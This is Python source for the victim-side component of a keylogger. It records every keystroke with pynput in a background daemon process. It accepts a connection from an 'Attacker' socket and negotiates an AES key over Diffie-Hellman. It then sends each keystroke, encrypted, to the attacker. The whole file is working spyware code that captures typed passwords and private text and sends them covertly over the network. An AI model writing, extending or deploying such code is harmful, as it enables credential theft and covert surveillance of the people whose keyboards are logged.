from pynput.keyboard import Listener
import socket
import json
from packet import *
from dhaes import *
import multiprocessing
import setproctitle

def victim_socket(ADDRESS):
    setproctitle.setproctitle("Victim")
    VictimSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    VictimSocket.bind(ADDRESS)
    VictimSocket.listen()
    AttackerSocket, _ = VictimSocket.accept()
    
    pga_packet = receive_packet(AttackerSocket)
    KEY = get_key(pga_packet,AttackerSocket)

    queue = multiprocessing.Queue()

    daemon = multiprocessing.Process(target=logger_deamon, args=(queue,), name="LoggerDeamon")
    daemon.daemon = True
    daemon.start()

    while True:
        send_keystoke(AttackerSocket, queue.get(), KEY)


def logger_deamon(queue):
    listener = Listener(on_press=lambda key: on_press(key, queue))
    listener.start()
    listener.join()  # Keep the listener running

def send_keystoke(client: socket.socket, keystroke: str, key: bytes):
    '''
    Send file compressed and encrypted with associated metadata 
    (Name and Nonce used for decryption)
    '''

    keystroke_enc, nonce= EncryptAES(key,keystroke)
    
    data_packet = Packet(nonce, keystroke_enc)

    client.sendall(data_packet.raw_packet())

def get_key(pga_packet: Packet, AttackerSocket: socket.socket) -> bytes:
    '''
    Process the packet containing the modp, generator and A, 
    and return the AES key.

    Uses the AttackerSocket to send B.
    '''
    pgA = json.loads(pga_packet.data)

    b = rand()
    B = PublicKey(pgA['g'], b, pgA['p'])
    B_packet = Packet('BBACK', B)
    send_packet(AttackerSocket,B_packet)

    K = SharedSecret(pgA['A'],b,pgA['p'])
    Kb = str(K).encode('utf-8')

    return key_AES(Kb)

def on_press(key: str, queue: multiprocessing.Queue):
    '''
    Just puts the recorded key in the queue.
    '''
    try:
        queue.put(obj=format(key.char),block=True)
    except AttributeError:
        queue.put(obj=format(key),block=True)
